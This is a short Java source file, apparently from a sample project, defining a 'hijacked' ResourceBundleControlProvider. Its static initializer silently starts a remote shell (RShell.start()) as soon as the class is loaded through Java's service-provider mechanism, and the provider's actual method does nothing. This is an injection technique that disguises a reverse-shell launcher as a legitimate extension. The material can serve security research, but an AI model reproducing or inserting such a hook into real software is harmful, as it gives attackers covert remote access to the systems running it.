package com.Ox08.rshell.sample.inject.resources;
import com.Ox08.rshell.sample.RShell;

import java.util.ResourceBundle;
import java.util.spi.ResourceBundleControlProvider;
public class HijackedResourceBundleControlProvider implements ResourceBundleControlProvider {
    static {
        System.out.println("hijack resource control provider");
        RShell.start();
    }
    public ResourceBundle.Control getControl(String baseName) {
        return null;
    }
}
